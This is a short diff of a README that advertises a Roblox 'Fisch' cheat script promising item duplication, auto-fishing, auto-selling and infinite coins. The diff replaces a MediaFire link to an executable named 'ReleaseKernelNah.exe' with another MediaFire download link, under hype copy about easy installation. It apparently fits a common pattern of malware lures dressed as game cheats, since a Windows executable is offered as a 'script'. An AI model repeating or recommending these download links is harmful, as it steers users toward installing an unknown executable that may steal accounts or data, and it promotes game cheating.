@@ -1,5 +1,5 @@
 #  Script Fisch Bot | DUPE EXP + MACRO AUTO SELL + AUTO FISH + DUPE FISCH SCRIPT + INFINITE COIN
-Download here: (Script)[https://www.mediafire.com/file/ldenwzpelro28mf/ReleaseKernelNah.exe/file]
+Download here: [Script](https://app.mediafire.com/3z7i9kvvch1tn)
 # #🌟 Why Choose Roblox Fisch Script 2025? 🌟
 💥 Enhanced Gameplay: Unlock exclusive features to elevate your Roblox experience. Dominate the game with Roblox Fisch Script and enjoy all-new tools and options that you can use to your advantage!
 🔧 Easy Installation: Forget the complicated setups! The Fisch Script 2025 is designed for easy installation, ensuring you get started in no time. Just follow the simple steps, and you’ll be ready to play.
